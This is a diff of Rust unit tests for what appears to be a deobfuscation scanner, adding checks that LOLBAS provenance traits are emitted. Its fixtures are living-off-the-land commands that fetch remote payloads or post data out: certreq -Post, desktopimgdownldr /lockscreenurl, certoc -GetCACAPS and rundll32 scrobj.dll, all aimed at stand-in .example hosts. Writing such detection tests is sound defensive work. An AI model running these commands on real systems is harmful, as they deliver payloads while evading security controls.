@@ -12790,10 +12790,8 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
     fn certreq_config_url_in_deob_text_emits_typed_trait() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://certreq-deob.example/submit";
-        crate::deob_scan::scan_deob_text(
-            &format!(r#"certreq -Post -config "{url}" request.req response.txt"#),
-            &mut env,
-        );
+        let line = format!(r#"certreq -Post -config "{url}" request.req response.txt"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -12809,6 +12807,16 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "certreq config URL double-emitted as generic: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "certreq" && cmd == &line
+                )
+            }),
+            "certreq config URL missing LOLBAS provenance in deob text: {:?}",
             env.traits
         );
     }
@@ -12844,10 +12852,8 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
     fn desktopimgdownldr_lockscreenurl_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://desktopimg-deob.example/a.jpg";
-        crate::deob_scan::scan_deob_text(
-            &format!(r#"desktopimgdownldr.exe /lockscreenurl:{url} /eventName:test"#),
-            &mut env,
-        );
+        let line = format!(r#"desktopimgdownldr.exe /lockscreenurl:{url} /eventName:test"#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -12865,13 +12871,24 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
             "desktopimgdownldr URL double-emitted as generic: {:?}",
             env.traits
         );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "desktopimgdownldr" && cmd == &line
+                )
+            }),
+            "desktopimgdownldr URL missing LOLBAS provenance in deob text: {:?}",
+            env.traits
+        );
     }
 
     #[test]
     fn certoc_getcacaps_url_in_deob_text_emits_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         let url = "https://certoc-deob.example/stage.ps1";
-        crate::deob_scan::scan_deob_text(&format!(r#"certoc.exe -GetCACAPS "{url}""#), &mut env);
+        let line = format!(r#"certoc.exe -GetCACAPS "{url}""#);
+        crate::deob_scan::scan_deob_text(&line, &mut env);
         assert!(
             env.traits.iter().any(|t| {
                 matches!(
@@ -12887,6 +12904,16 @@ rundll32.exe scrobj.dll,GenerateTypeLib https://rundll32-scrobj-deob.example/pay
                 .iter()
                 .any(|t| matches!(t, Trait::DownloadInDeobText { src, .. } if src == url)),
             "certoc GetCACAPS URL double-emitted as generic: {:?}",
+            env.traits
+        );
+        assert!(
+            env.traits.iter().any(|t| {
+                matches!(
+                    t,
+                    Trait::Lolbas { name, cmd } if name == "certoc" && cmd == &line
+                )
+            }),
+            "certoc GetCACAPS URL missing LOLBAS provenance in deob text: {:?}",
             env.traits
         );
     }
